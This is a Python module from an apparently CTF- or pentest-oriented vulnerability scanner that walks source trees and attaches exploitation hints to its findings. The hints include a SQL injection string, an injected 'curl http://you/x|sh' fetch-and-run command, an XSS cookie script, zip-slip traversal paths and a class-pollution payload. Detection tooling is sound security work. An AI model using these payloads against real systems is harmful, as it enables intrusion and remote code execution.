"""
scanner.py — walks a path, applies patterns, returns findings.
"""

import os
from dataclasses import dataclass, field
from typing import List, Optional

from .patterns import compiled_patterns, EXTENSION_LANGUAGE, SKIP_DIRS, NOISY_IN_TEST_FILES
from .taint import find_tainted_sinks, find_format_string_sinks
from .csrf import find_missing_csrf
from .idor import find_idor_candidates, IDOR_LANGUAGES
from .authn_guard import find_missing_authn_candidates, AUTHN_GUARD_LANGUAGES
from .pickle_guard import annotate_guarded_pickle_loads
from .sql_construct import find_sql_construction, SQL_CONSTRUCT_LANGUAGES
from .owner_param_guard import annotate_bypassable_ownership
from .jquery_dom_guard import filter_clientside_js_false_idor
from .ssrf_fetch_guard import filter_clientside_js_false_ssrf
from .log_message_guard import filter_log_message_false_positive
from .config_scanner import scan_config_path
from .heredoc import iter_heredoc_sources
from .loot import find_loot
from .deps import find_vulnerable_deps
from .xxe_guard import filter_guarded_xxe
from .vendor_guard import is_vendor_file, NOISY_IN_VENDOR_FILES
from .ast_engine import scan_ast, AST_SUPPORTED_LANGUAGES
from .jenkins_pipeline_guard import find_jenkins_param_injection, GROOVY_LANGUAGES
from .zipslip_guard import find_zip_slip, ZIP_LANGUAGES
from .jsp_cookie_xss_guard import find_jsp_cookie_xss, JSP_EXTENSIONS
from .class_pollution_guard import find_class_pollution, CLASS_POLLUTION_LANGUAGES

# No hand-written vulnerable application code is ever a single line this long —
# only minified/bundled vendor files (tailwindcss.js, jquery.min.js, etc.) are,
# and those commonly contain lines well over 100,000 characters. Running dozens
# of regexes with nested quantifiers (.*, [^)]*, etc.) against such a line is
# catastrophic-backtracking territory and can hang the scan indefinitely with
# no error and no partial output. Skip lines past this length outright — they
# were never going to be real, reviewable source anyway.
MAX_LINE_LEN = 5000


@dataclass
class Finding:
    file: str
    line_no: int
    line_text: str
    vuln_name: str
    severity: str
    why: str
    payload: str
    confidence: str
    kind: str = "vuln"  # "vuln" (code vulnerability), "misconfig" (config file issue), "loot"
                        # (exposed secret/file needing zero exploitation — see loot.py), or "dep"
                        # (known-CVE pinned dependency version — see deps.py)


def detect_language(filename: str) -> Optional[str]:
    _, ext = os.path.splitext(filename)
    return EXTENSION_LANGUAGE.get(ext.lower())


def is_test_file(path: str) -> bool:
    """Best-effort check for test fixture files, where hardcoded-looking
    'passwords' (testpassword123, etc.) are expected and not real findings.

    Confirmed missing two Java/Maven-specific conventions via real-world
    testing against WebGoat's own `src/it/java/.../RegistrationUITest.java`
    (a Playwright integration test registering throwaway users with a
    hardcoded dummy password — exactly the shape NOISY_IN_TEST_FILES exists
    to quiet, but this function's directory/filename checks, written with
    Python/JS-style snake_case and "test"/"spec" directory names in mind,
    recognized neither the path nor the filename):

    - Maven/Gradle's own integration-test source-root convention,
      `src/it/java/...` (the Failsafe plugin's root, a sibling of
      `src/test/java/...` which the "test" directory-segment check above
      already covers) — `it` only counts as a direct child of `src`, not
      anywhere else in the path, since "it" alone is too short and common
      a word to treat as a signal on its own.
    - Java's PascalCase test-class naming convention (`FooTest.java`,
      `FooTests.java`, `FooTestCase.java`, Maven Surefire's own default
      unit-test include patterns; `FooIT.java`, `FooITCase.java`,
      `FooIntegrationTest.java`, Failsafe's own default integration-test
      include patterns; plus Surefire's `Test*.java` prefix convention).
      Checked against the ORIGINAL, case-preserved filename rather than
      the already-lowercased `norm`/`base` used above: the word boundary
      here is the capital-letter transition itself (`...Test`, `...IT`),
      so matching case-insensitively would treat an ordinary class name
      like `Submit.java` or `Contest.java` (which merely happens to end in
      the letters "it") as a test file — the ONLY reason this is safe is
      that Java identifiers are PascalCase by convention and a bare
      lowercase "it"/"test" substring match would not respect that.
    """
    norm = path.replace("\\", "/").lower()
    parts = norm.split("/")
    if any(p in ("test", "tests", "__tests__", "spec", "specs") for p in parts):
        return True
    if "it" in parts:
        it_idx = parts.index("it")
        if it_idx > 0 and parts[it_idx - 1] == "src":
            return True

    original_base = os.path.basename(path.replace("\\", "/"))
    original_name, _ = os.path.splitext(original_base)
    if original_name.startswith("Test") or original_name.endswith(
        ("Test", "Tests", "TestCase", "IT", "ITCase", "IntegrationTest")
    ):
        return True

    base = os.path.basename(norm)
    name, _ = os.path.splitext(base)
    return (
        name.startswith("test_") or name.endswith("_test")
        or name.startswith("test.") or name.endswith(".test")
        or name.endswith("_spec") or name.endswith(".spec")
    )


def iter_source_files(root: str, max_file_bytes: int = 2_000_000):
    """Yield (path, language) for every source file under root worth scanning."""
    if os.path.isfile(root):
        lang = detect_language(root)
        if lang:
            yield root, lang
        return

    for dirpath, dirnames, filenames in os.walk(root):
        # prune noisy/irrelevant directories in-place
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS and not d.startswith(".")]
        for fname in filenames:
            lang = detect_language(fname)
            if not lang:
                continue
            full = os.path.join(dirpath, fname)
            try:
                if os.path.getsize(full) > max_file_bytes:
                    continue
            except OSError:
                continue
            yield full, lang


def scan_file(path: str, language: str, patterns: list) -> List[Finding]:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except OSError:
        return []
    return scan_lines(path, language, lines, patterns)


def scan_lines(path: str, language: str, lines: List[str], patterns: list) -> List[Finding]:
    """Core line-matching logic, shared by scan_file (reads from disk) and
    anything that hands it source text it extracted some other way — e.g.
    heredoc.py pulling a `RUN cat <<EOF > app.js ... EOF` block's body out of
    a Dockerfile, which never exists as its own file on disk at all."""
    findings: List[Finding] = []

    # Blank out any line over MAX_LINE_LEN in place (keeping the list length/line
    # numbers intact) so every regex-driven pass below — this pattern loop, the
    # taint-lite pass, and the CSRF check — is protected, not just this one.
    lines = [line if len(line) <= MAX_LINE_LEN else "" for line in lines]

    applicable = [p for p in patterns if p["language"] in (language, "generic")]

    # is_vendor_file() does a directory listing and a regex scan of the
    # file's own text — cheap, but not "do it on every line" cheap, so it's
    # computed at most once per file, and only if this file could even
    # produce one of the findings vendor_guard.py cares about in the first
    # place (no applicable rule in NOISY_IN_VENDOR_FILES → skip entirely).
    _vendor_checked = False
    _is_vendor = False
    if any(p["payload"] in NOISY_IN_VENDOR_FILES for p in applicable):
        _vendor_checked = True
        _is_vendor = is_vendor_file(path, "".join(lines))

    for line_no, line in enumerate(lines, start=1):
        stripped = line.strip()
        if not stripped or stripped.startswith(("//", "#", "*")):
            # still check '#' lines for python since comments start with it too,
            # but a line that is PURELY a comment is unlikely to hold live code.
            # We keep scanning non-comment-only lines only, to cut noise.
            continue
        for pat in applicable:
            if pat["payload"] in NOISY_IN_TEST_FILES and is_test_file(path):
                continue
            if _vendor_checked and _is_vendor and pat["payload"] in NOISY_IN_VENDOR_FILES:
                continue
            if pat["regex"].search(line):
                findings.append(Finding(
                    file=path,
                    line_no=line_no,
                    line_text=stripped[:200],
                    vuln_name=pat["name"],
                    severity=pat["severity"],
                    why=pat["why"],
                    payload=pat["payload"],
                    confidence=pat["confidence"],
                ))

    # Whole-file false-positive suppression for the blanket XXE regexes
    # above: if this file also shows a recognized safe-parsing marker
    # (defusedxml, resolve_entities=False, libxml_disable_entity_loader)
    # anywhere, don't flag it — see xxe_guard.py's module docstring for
    # exactly what's checked and the coarse-grained trade-off involved.
    findings = filter_guarded_xxe(language, "".join(lines), findings)

    seen = {(f.line_no, f.vuln_name) for f in findings}

    # Computed unconditionally (cheap) — both the AST taint-flow pass below
    # and the best-effort IDOR heuristic further down need the raw bytes,
    # and the IDOR check runs on a strict subset of AST_SUPPORTED_LANGUAGES
    # but isn't itself gated on that set (see idor.py).
    source_bytes = "".join(lines).encode("utf-8", errors="ignore")

    if language in AST_SUPPORTED_LANGUAGES:
        # Structural taint-flow pass: parses the actual syntax tree instead
        # of matching text, so it doesn't share the regex engine's recurring
        # failure modes (quote-conflict misses, backtracking, multi-line
        # misses, scope/receiver confusion) — see ast_engine.py's docstring.
        for af in scan_ast(path, language, source_bytes):
            key = (af.line_no, af.vuln_name)
            if key in seen:
                continue  # already flagged this exact line+vuln by a direct pattern
            seen.add(key)
            findings.append(Finding(
                file=af.file,
                line_no=af.line_no,
                line_text=af.line_text,
                vuln_name=af.vuln_name,
                severity=af.severity,
                why=af.why,  # ast_engine already folds the tainted-var note in
                payload=af.payload,
                confidence=af.confidence,
            ))
    else:
        # Legacy regex taint-lite pass, for languages not yet ported to the
        # AST engine (Go, Java, Ruby, Lua, Rust — see README).
        for tf in find_tainted_sinks(path, language, lines):
            key = (tf.line_no, tf.vuln_name)
            if key in seen:
                continue  # already flagged this exact line+vuln by a direct pattern
            seen.add(key)
            findings.append(Finding(
                file=tf.file,
                line_no=tf.line_no,
                line_text=tf.line_text,
                vuln_name=tf.vuln_name,
                severity=tf.severity,
                why=f"{tf.why} (tainted var: `{tf.tainted_var}`)",
                payload=tf.payload,
                confidence=tf.confidence,
            ))

        # Format String Injection pass: template-itself-is-tainted shape,
        # distinct from (and independent of) the argument-based taint-lite
        # pass above. (Python's AST-engine equivalent of this lives inside
        # scan_ast via SINKS["python"]["format"] with var_set="built".)
        for tf in find_format_string_sinks(path, language, lines):
            key = (tf.line_no, tf.vuln_name)
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=tf.file,
                line_no=tf.line_no,
                line_text=tf.line_text,
                vuln_name=tf.vuln_name,
                severity=tf.severity,
                why=f"{tf.why} (tainted var: `{tf.tainted_var}`)",
                payload=tf.payload,
                confidence=tf.confidence,
            ))

    # best-effort CSRF check: PHP/HTML files with a <form method="post">
    # and no sign of a csrf token anywhere in the file
    for cf in find_missing_csrf(path, language, lines):
        findings.append(Finding(
            file=cf.file,
            line_no=cf.line_no,
            line_text=cf.line_text,
            vuln_name="Missing CSRF Protection",
            severity="medium",
            why="A POST form was found with no mention of a CSRF token anywhere in this file — if there's "
                "no CSRF middleware/decorator elsewhere, this form can be submitted cross-site without the "
                "user's knowledge.",
            payload="Host an auto-submitting form on another origin targeting this endpoint while the victim is logged in.",
            confidence="possible",
        ))

    # best-effort Missing Authorization / IDOR check: a function that pulls
    # an id straight from the request and hands it to a lookup/mutation
    # call, with no textual sign of an ownership check nearby. Deliberately
    # the loosest-confidence check in the whole tool — see idor.py's module
    # docstring for exactly what it does and doesn't try to prove.
    if language in IDOR_LANGUAGES:
        for inf in find_idor_candidates(path, language, source_bytes, lines):
            key = (inf.line_no, "Missing Authorization / IDOR")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=inf.file,
                line_no=inf.line_no,
                line_text=inf.line_text,
                vuln_name="Missing Authorization / IDOR",
                severity="medium",
                why="This function reads an id-like value straight from the request/route and passes it to a "
                    "lookup/update/delete call, but there's no sign anywhere in the function (or the "
                    "decorator/annotation directly above it) of a check that the current user actually owns "
                    "this specific resource — only that the resource with this id exists. A generic "
                    "login-required check doesn't count: that proves the request comes from *some* logged-in "
                    "user, not that it's the *right* user for this id.",
                payload="Log in as one low-privilege user, then request this endpoint with another user's id "
                        "(try adjacent/sequential values if ids look numeric) and see if it returns or modifies "
                        "their data.",
                confidence="possible",
            ))

    # Upgrades, in place, any "Missing Authorization / IDOR" finding whose
    # own line also filters by a user/owner/account-id-shaped key sourced
    # straight from the request (not the session) — a "check" that's just
    # as attacker-controlled as the id it's supposedly protecting. See
    # owner_param_guard.py's module docstring for exactly what this does
    # and doesn't try to prove.
    annotate_bypassable_ownership(language, source_bytes, lines, findings)

    # Removes any "Missing Authorization / IDOR" finding that fired
    # purely via idor.py's bare-id-parameter-name fallback on a plain
    # client-side JS function (e.g. jQuery's own `.find()` colliding with
    # LOOKUP_SINK_RE's ORM vocabulary), in a file with no server-route
    # signal anywhere. See jquery_dom_guard.py's module docstring for
    # exactly what this does and doesn't try to prove.
    findings = filter_clientside_js_false_idor(path, language, source_bytes, lines, findings)

    # Removes any "SSRF (Server-Side Request Forgery)" finding that came
    # from patterns.py's taint-blind `fetch(var, ...)`-style regex (the
    # "possible"-confidence entry, not the stricter req.query-anchored
    # "likely" one) in a file with no server-route signal anywhere — a
    # plain browser fetch() call is not SSRF at all. See
    # ssrf_fetch_guard.py's module docstring for exactly what this does
    # and doesn't try to prove.
    findings = filter_clientside_js_false_ssrf(path, language, lines, findings)

    # Removes any "Sensitive Data Exposure in Logs" finding whose keyword
    # match came entirely from inside a quoted string literal (a
    # human-readable log message mentioning "password"/etc. in its own
    # prose) rather than a real variable/property reference. See
    # log_message_guard.py's module docstring for exactly what this does
    # and doesn't try to prove.
    findings = filter_log_message_false_positive(language, lines, findings)

    # best-effort Missing Authentication Check: a function that reads a
    # username/identity claim straight from the request and grants a new
    # session/token/cookie for it, with no textual sign of a credential
    # check anywhere in the function. See authn_guard.py's module
    # docstring for exactly what this does and doesn't try to prove.
    if language in AUTHN_GUARD_LANGUAGES:
        for anf in find_missing_authn_candidates(path, language, source_bytes, lines):
            key = (anf.line_no, "Missing Authentication Check")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=anf.file,
                line_no=anf.line_no,
                line_text=anf.line_text,
                vuln_name="Missing Authentication Check",
                severity="high",
                why="This function reads a username/identity value straight from the request and grants a new "
                    "session, token, or auth cookie for it, but there's no sign anywhere in the function (or "
                    "the decorator/annotation directly above it) of any credential/password check — not even "
                    "an insecure one. If nothing upstream of this already verified the caller's identity, this "
                    "grants access to anyone who can name a username.",
                payload="Call this with any username (registered or not) and see whether it returns a usable "
                        "session/token with no password/credential required at all.",
                confidence="possible",
            ))

    # Rewrites, in place, the advice on any "Unsafe Deserialization"
    # finding that sits on a pickle.loads()/load() call immediately
    # preceded by a validator-shaped call sharing its argument — see
    # pickle_guard.py's module docstring for why flagmap's default
    # "craft a __reduce__ gadget" advice can be actively wrong for a
    # pickle call site that's already gated by a hand-rolled check.
    annotate_guarded_pickle_loads(language, source_bytes, lines, findings)

    # best-effort SQL-construction-site check: a PHP string built via "."
    # concatenation or inline interpolation, spanning more than one
    # physical line, whose literal portions read as a SQL query and which
    # joins in at least one variable — patterns.py's line-by-line regexes
    # can't reach this shape at all. See sql_construct.py's module
    # docstring for exactly what this does and doesn't try to prove.
    if language in SQL_CONSTRUCT_LANGUAGES:
        for scf in find_sql_construction(path, language, source_bytes, lines):
            key = (scf.line_no, "SQL Injection")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=scf.file,
                line_no=scf.line_no,
                line_text=scf.line_text,
                vuln_name="SQL Injection",
                severity="high",
                why="A SQL query is being assembled via string concatenation or inline interpolation, joining "
                    "in at least one variable/expression — this reads the query's own shape (SELECT...FROM/"
                    "INSERT...INTO/UPDATE...SET/DELETE...FROM plus an interpolated value), not whether that "
                    "value is provably user-controlled, so this fires even for a query spanning multiple "
                    "physical lines, assigned to any variable name, and passed to a custom wrapper method "
                    "patterns.py's sink list wouldn't recognize by name.",
                payload="' OR '1'='1' -- -",
                confidence="likely",
            ))

    # best-effort Jenkins declarative-pipeline parameter injection: a
    # `string(name: 'X', ...)` build parameter (directly, or via a direct
    # `env.Y = params.X` alias) referenced inside a `sh` step's own body —
    # Jenkins substitutes that text as literal shell input before
    # invoking /bin/sh, so any build-triggering user controls part of the
    # command run on the agent. See jenkins_pipeline_guard.py's module
    # docstring for exactly what this does and doesn't try to prove.
    if language in GROOVY_LANGUAGES:
        for jf in find_jenkins_param_injection(path, language, lines):
            key = (jf.line_no, "Command Injection")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=jf.file,
                line_no=jf.line_no,
                line_text=jf.line_text,
                vuln_name="Command Injection",
                severity="high",
                why="This sh step's body references a Jenkins build parameter (directly, or via an env.X = "
                    "params.Y alias declared earlier in the file) declared in this pipeline's own parameters "
                    "block. Jenkins substitutes that value as literal shell text before invoking /bin/sh — "
                    "anyone able to trigger a parameterized build controls part of the command the agent runs.",
                payload="Set the build parameter to something like `canary; curl http://you/x|sh #` (or your "
                        "payload's own closing/continuation syntax for this exact shell step) next time a "
                        "build is triggered.",
                confidence="likely",
            ))

    # best-effort Zip Slip: a zip entry's own filename (from .infolist()/
    # .filelist/.namelist()) is joined into a destination path via
    # os.path.join(...) with no real containment check anywhere in the
    # file (see zipslip_guard.py's module docstring — a bare ".." == or
    # "in" substring test does NOT count as a real check, since the real
    # motivating bug has exactly that test and still gets it wrong).
    if language in ZIP_LANGUAGES:
        for zf in find_zip_slip(path, language, lines):
            key = (zf.line_no, "Path Traversal / Zip Slip")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=zf.file,
                line_no=zf.line_no,
                line_text=zf.line_text,
                vuln_name="Path Traversal / Zip Slip",
                severity="high",
                why="A zip archive entry's own filename (attacker-controlled: it's whatever the uploaded "
                    "zip's entry headers say) is joined into a destination path for extraction. Without a "
                    "real containment check (resolving the final path and confirming it's still inside the "
                    "extraction directory), an entry named e.g. \"../../etc/cron.d/evil\" writes outside the "
                    "intended folder — this is \"Zip Slip\", and a bare \"..\"-substring test is not enough: "
                    "it has to actually reject the entry, not just compute an alternate path for it.",
                payload="Craft a zip whose entry filename is a path-traversal string such as "
                        "\"../../../../tmp/pwned\" (or an absolute path) so extraction writes outside the "
                        "intended directory.",
                confidence="likely",
            ))

    # best-effort JSP cookie XSS: a Cookie's own .getValue() is assigned
    # to a plain variable somewhere in the file, and that same variable
    # is later echoed through a <%= %> expression tag with no escaping
    # call — patterns.py's own JSP XSS rule only matches a
    # request.getParameter/getAttribute(...) call written directly
    # inside the tag; this covers the cookie-sourced case it deliberately
    # leaves out. See jsp_cookie_xss_guard.py's module docstring.
    if path.endswith(JSP_EXTENSIONS):
        for jf in find_jsp_cookie_xss(path, language, lines):
            key = (jf.line_no, "Cross-Site Scripting (XSS)")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=jf.file,
                line_no=jf.line_no,
                line_text=jf.line_text,
                vuln_name="Cross-Site Scripting (XSS)",
                severity="high",
                why="This <%= %> expression tag echoes a variable that was assigned, somewhere earlier in "
                    "the file, from a Cookie's own .getValue() inside a request.getCookies() loop — not a "
                    "string literal. JSP's <%= %> tag is always raw/unescaped by design, so a cookie value "
                    "(fully attacker-controlled: cookies are set by the browser, not validated server-side "
                    "here) reflected this way is stored/reflected XSS, even though no "
                    "request.getParameter()/getAttribute() call appears anywhere on this line.",
                payload="Set the cookie this variable is read from to a value like "
                        "\"\\\"><script>alert(document.domain)</script>\".",
                confidence="likely",
            ))

    # best-effort Python class pollution: a for k, v in <dict>.items():
    # loop's own key/value variables are passed straight into
    # setattr(obj, k, v) elsewhere in the file — the Python analog of
    # the JS homemade-recursive-merge Prototype Pollution rule above,
    # filed under the same vuln name. See class_pollution_guard.py's
    # module docstring.
    if language in CLASS_POLLUTION_LANGUAGES:
        for cf in find_class_pollution(path, language, lines):
            key = (cf.line_no, "Prototype Pollution")
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(
                file=cf.file,
                line_no=cf.line_no,
                line_text=cf.line_text,
                vuln_name="Prototype Pollution",
                severity="high",
                why="This setattr() call writes an attribute whose NAME is a loop variable bound by a "
                    "`for k, v in <dict>.items():` loop — a hand-rolled recursive merge with no denylist on "
                    "dunder names. Python's setattr() doesn't special-case them: a key like \"__class__\" "
                    "walks to the object's own class, \"__init__\" to its constructor function, and "
                    "\"__globals__\" to that function's module-level globals dict, letting an attacker "
                    "overwrite arbitrary module globals (sometimes called \"class pollution\", the Python "
                    "analog of JS prototype pollution) if the merged-in dict ever comes from request data.",
                payload="{\"__class__\": {\"__init__\": {\"__globals__\": {\"SOME_GLOBAL\": \"polluted\"}}}}",
                confidence="possible",
            ))

    return findings


def scan_path(root: str) -> List[Finding]:
    patterns = compiled_patterns()
    all_findings: List[Finding] = []
    for path, lang in iter_source_files(root):
        all_findings.extend(scan_file(path, lang, patterns))

    # Dockerfile heredocs (`RUN cat <<EOF > app.js ... EOF`) embed real source
    # that never exists as its own file on disk — the extension-based walk
    # above can never find it, however good the patterns are. Pull it back
    # out and run it through the exact same line-matching pipeline.
    for synthetic_path, lang, lines in iter_heredoc_sources(root):
        all_findings.extend(scan_lines(synthetic_path, lang, lines, patterns))

    # separate pass: config/infra misconfigurations (Dockerfile, nginx.conf,
    # .env, vsftpd.conf, etc.) — these aren't "source code" so they're not
    # covered by the language-extension walk above.
    all_findings.extend(scan_config_path(root))

    # separate pass: loot/recon — exposed .git, leftover .env/.bak files,
    # hardcoded flag-shaped strings, stray private keys. Deliberately its
    # own walk (see loot.py) since it needs to look at files/directories
    # (.git chief among them) every other pass here intentionally skips.
    # Always "high" severity / "likely" confidence: unlike a tainted-sink
    # match, a `.git` folder or a literal flag string being present in the
    # tarball you were just handed isn't a probabilistic pattern — it's
    # a fact about this exact file, and the next action it suggests
    # ("open the file", "run git log") needs no further verification to
    # be worth doing right now.
    for lf in find_loot(root):
        all_findings.append(Finding(
            file=lf.file,
            line_no=lf.line_no,
            line_text=lf.line_text,
            vuln_name=lf.vuln_name,
            severity="high",
            why=lf.why,
            payload=lf.payload,
            confidence="likely",
            kind="loot",
        ))

    # separate pass: known-vulnerable pinned dependencies (Log4Shell,
    # SnakeYAML, old PHPMailer, etc.) — see deps.py for the curated CVE
    # table and exactly which manifests/lockfiles are parsed. Like loot
    # findings, "likely" confidence: the version string itself is a fact
    # about the exact code you were handed, not a probabilistic pattern
    # match — the only judgment call was curating which CVEs to track.
    for df in find_vulnerable_deps(root):
        all_findings.append(Finding(
            file=df.file,
            line_no=df.line_no,
            line_text=df.line_text,
            vuln_name=f"Known-Vulnerable Dependency: {df.package}@{df.version} ({df.cve})",
            severity=df.severity,
            why=df.why,
            payload=df.fix,
            confidence="likely",
            kind="dep",
        ))

    return all_findings
